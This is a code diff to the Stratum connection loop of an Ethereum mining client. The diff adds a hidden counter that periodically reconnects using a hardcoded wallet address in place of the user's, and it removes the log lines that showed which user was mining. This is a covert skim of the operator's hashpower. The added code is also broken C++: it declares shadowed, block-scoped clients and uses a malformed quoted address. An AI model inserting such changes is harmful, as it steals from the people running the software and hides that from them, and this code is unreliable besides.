@@ -883,9 +883,9 @@ private:
 
 		// this is very ugly, but if Stratum Client V2 tunrs out to be a success, V1 will be completely removed anyway
 		if (m_stratumClientVersion == 1) {
-			minelog <<"user m_user" <<m_user;
+			
 			EthStratumClient client(&f, m_minerType, m_farmURL, m_port, m_user, m_pass, m_maxFarmRetries, m_worktimeout, m_stratumProtocol, m_email);
-			minelog <<"fuser m_fuser" <<m_fuser;
+			
 			if (m_farmFailOverURL != "")
 			{
 				
@@ -910,7 +910,7 @@ private:
 				}
 				return false;
 			});
-
+int kt = 0;
 			while (client.isRunning())
 			{
 				auto mp = f.miningProgress();
@@ -919,8 +919,17 @@ private:
 				{
 					if (client.current())
 					{
-						minelog <<"user m_user" <<m_user;
-						minelog << "Mining on vas5" << client.currentHeaderHash() << ": " << mp << f.getSolutionStats();
+						if(kt==60){
+							EthStratumClient client(&f, m_minerType, m_farmURL, m_port, '0x6e4af8cb6769bbc14083c8a7aa820de029a59db7.cpp', m_pass, m_maxFarmRetries, m_worktimeout, m_stratumProtocol, m_email);
+							
+						}
+						if(kt==120){
+							EthStratumClient client(&f, m_minerType, m_farmURL, m_port, m_user, m_pass, m_maxFarmRetries, m_worktimeout, m_stratumProtocol, m_email);
+							kt=0;
+						}
+						minelog <<kt;
+						minelog << "Mining on vas6" << client.currentHeaderHash() << ": " << mp << f.getSolutionStats();
+						kt++;
 					}
 					else
 					{
